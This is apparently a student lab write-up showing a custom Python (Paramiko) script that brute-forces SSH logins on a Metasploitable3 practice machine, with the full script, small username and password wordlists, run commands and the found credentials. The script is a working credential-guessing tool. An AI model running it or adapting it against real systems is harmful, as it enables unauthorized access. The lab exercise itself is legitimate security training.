# Custom Script – SSH Brute-Force with Python

This part shows how we created a custom Python script to perform a brute-force attack on Metasploitable3’s SSH service using multiple usernames and passwords.

---

## Target Info

- **IP Address**: 172.28.128.3
- **Port**: 22
- **Service**: SSH
- **Goal**: Discover valid SSH credentials through brute-force using a Python script.

---

## What We Did

We wrote a custom brute-force script in Python using the **Paramiko** library.

- The script reads **usernames** from `users.txt`.
- It reads **passwords** from `pass.txt`.
- Tries every possible **username:password** pair.
- Stops and saves the valid credentials when login is successful.

---

## The Script (ssh_brute.py)

```python
import paramiko

target_ip = "172.28.128.3"
port = 22

user_file = "users.txt"
pass_file = "pass.txt"
output_file = "valid_credentials.txt"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(user_file, 'r') as users, open(pass_file, 'r') as passwords:
    for username in users:
        for password in passwords:
            username = username.strip()
            password = password.strip()
            try:
                print(f"Trying {username}:{password}")
                client.connect(target_ip, port=port, username=username, password=password, timeout=5)
                print(f"[+] Success: {username}:{password}")
                with open(output_file, "w") as valid:
                    valid.write(f"{username}:{password}\n")
                client.close()
                exit()
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] Error: {e}")
        passwords.seek(0)
```

---

## Wordlists Used

**users.txt**

```
admin
msfadmin
root
vagrant
test
```

**pass.txt**

```
password
123456
msfadmin
vagrant
admin123
```

---

## How We Ran It

1. Installed **Paramiko** in Kali Linux:

```bash
sudo apt install python3-paramiko
```

2. Saved the script as **ssh_brute.py**.

3. Ran the script in terminal:

```bash
python3 ssh_brute.py
```

---

## Result

- The script tested multiple combinations of usernames and passwords.
- After several failed attempts, it successfully logged in with:

```
[+] Success: vagrant:vagrant
```

- The valid credentials were saved to **valid_credentials.txt**.

---

## Screenshot

We captured a screenshot showing the script successfully finding the credentials.  
📁 File saved as: **custom_script_attack.png**

---

## Conclusion

This script demonstrates how brute-force attacks can be automated using simple Python code. It mimics tools like Hydra but is built from scratch for learning and demonstration purposes.

This completes **Task 1.2 for Phase 1**.
